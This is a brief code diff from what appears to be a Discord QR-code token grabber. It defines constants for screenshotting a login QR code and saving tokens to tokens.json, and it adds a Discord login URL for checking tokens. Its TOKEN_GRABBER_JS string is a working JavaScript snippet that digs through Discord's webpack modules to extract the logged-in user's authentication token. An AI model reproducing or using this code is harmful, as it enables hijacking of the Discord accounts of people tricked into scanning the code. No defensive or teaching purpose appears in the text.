@@ -6,3 +6,4 @@ QR_ELEMENT_SELECTOR = '#app-mount > div.appAsidePanelWrapper-ev4hlp > div.notApp
 IMAGE_LOCATION = os.path.join(os.path.join(os.getcwd(), "screenshots"), "qr.png")
 TOKEN_GRABBER_JS = r"return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
 TOKENS_FILE_NAME = "tokens.json"
+DISCORD_TOKEN_CHECK_URL = "https://discord.com/api/v6/auth/login"
